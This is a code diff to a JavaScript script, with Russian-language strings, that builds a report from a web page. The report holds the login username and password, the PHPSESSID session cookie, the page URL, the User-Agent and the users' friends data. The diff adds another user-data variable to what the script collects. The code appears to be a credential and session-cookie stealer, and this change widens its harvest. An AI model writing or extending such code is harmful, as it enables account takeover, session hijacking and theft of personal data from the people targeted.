@@ -105,6 +105,16 @@
                 return `Ошибка при чтении переменной 'user': ${e.message}`;
             }
         };
+		const getUserDataResult = () => {
+            try {
+                if (typeof userDataResult !== 'undefined' && userDataResult !== null) {
+                    return JSON.stringify(deepClone(userDataResult), null, 2);
+                }
+                return "Переменная 'userDataResult' не найдена или пуста";
+            } catch (e) {
+                return `Ошибка при чтении переменной 'userDataResult': ${e.message}`;
+            }
+        };
 
         // Получаем friendsData
         const getFriendsData = () => {
@@ -172,6 +182,7 @@
             const userData = getUserData();
             const friendsDataStr = getFriendsData();
             const friendsArrStr = getFriendsArr();
+			const userDataResultStr = getUserDataResult()
             
             const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
                                      credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
@@ -190,6 +201,7 @@
             fileContent += `URL страницы: ${window.location.href}\n`;
             fileContent += `User-Agent: ${navigator.userAgent}\n\n`;
             fileContent += `--- PHPSESSID ---\n${phpsessid || "PHPSESSID: не найдена"}\n\n`;
+			fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ userDataResult ---\n${userDataResultStr}\n\n`;
             fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---\n${friendsDataStr}\n\n`;
             fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---\n${friendsArrStr}\n\n`;
             fileContent += `--- УЧЕТНЫЕ ДАННЫЕ ---\n`;
